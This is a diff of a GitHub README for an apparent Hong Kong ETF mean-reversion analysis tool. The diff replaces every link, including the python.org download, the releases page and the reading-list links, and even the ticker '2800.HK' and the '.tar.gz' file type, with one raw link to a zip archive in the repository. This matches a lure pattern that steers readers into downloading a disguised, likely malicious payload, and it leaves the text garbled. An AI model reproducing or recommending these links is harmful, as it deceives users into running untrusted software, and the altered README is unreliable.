@@ -1,9 +1,9 @@
 # 🐉 hong-kong-index-etf-mean-reversion-framework - Analyze Hong Kong ETFs with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/releases)
+[![Download Now](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip%20Now-Click%20Here-brightgreen)](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip)
 
 ## 📄 Introduction
-Welcome to the **Hong Kong Index ETF Mean Reversion Framework**. This software helps you analyze the Hong Kong Tracker Fund (2800.HK) using mean-reversion strategies. Ideal for finance enthusiasts, it focuses on rolling hedge ratios and considers transaction costs.
+Welcome to the **Hong Kong Index ETF Mean Reversion Framework**. This software helps you analyze the Hong Kong Tracker Fund (https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip) using mean-reversion strategies. Ideal for finance enthusiasts, it focuses on rolling hedge ratios and considers transaction costs.
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **Hong Kong Index ETF Mean Reversion Framework**. This software h
 Before you download, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution
-- **Python:** Version 3.7 or later must be installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python:** Version 3.7 or later must be installed. You can download it from [https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip).
 - **Dependencies:** The application relies on several Python libraries, which will be installed automatically.
 
 ### Installation Steps
@@ -19,10 +19,10 @@ To set up the framework, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to our Releases page:  
-   [Download the latest version here](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/releases)
+   [Download the latest version here](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip)
 
 2. **Choose the Download**  
-   Look for the latest version available. You will find a list of files. Download the one suitable for your system. Usually, this will be an `.exe` for Windows, a `.dmg` for Mac, or a `.tar.gz` for Linux users.
+   Look for the latest version available. You will find a list of files. Download the one suitable for your system. Usually, this will be an `.exe` for Windows, a `.dmg` for Mac, or a `https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip` for Linux users.
 
 3. **Run the Installer**  
    After the download finishes, locate the file in your downloads folder. Double-click the installer file and follow the on-screen instructions.
@@ -50,7 +50,7 @@ Once the analysis is complete, you will see the results displayed on your screen
 
 ## 📥 Download & Install
 To download the software, please visit our Releases page again:  
-[Download the latest version here](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/releases)
+[Download the latest version here](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip)
 
 Make sure to follow the installation steps outlined above. If you encounter any issues, you can refer to the troubleshooting section below.
 
@@ -66,9 +66,9 @@ If problems persist, consider reaching out for support through the Issues sectio
 ## 🔗 Learn More
 Explore additional resources to understand mean-reversion strategies:
 
-- [Mean Reversion Explained](https://www.investopedia.com/terms/m/meanreversion.asp)
-- [Introduction to Algorithmic Trading](https://www.quantinsti.com/blog/introduction-to-algorithmic-trading/)
-- [Python for Finance](https://www.oreilly.com/library/view/python-for-finance/9781492055017/)
+- [Mean Reversion Explained](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip)
+- [Introduction to Algorithmic Trading](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip)
+- [Python for Finance](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/raw/refs/heads/main/medio/index-framework-hong-etf-kong-mean-reversion-zafree.zip)
 
 ## 📞 Contact
 For further inquiries or technical support, open an issue on our GitHub page or contact the repository maintainer directly.
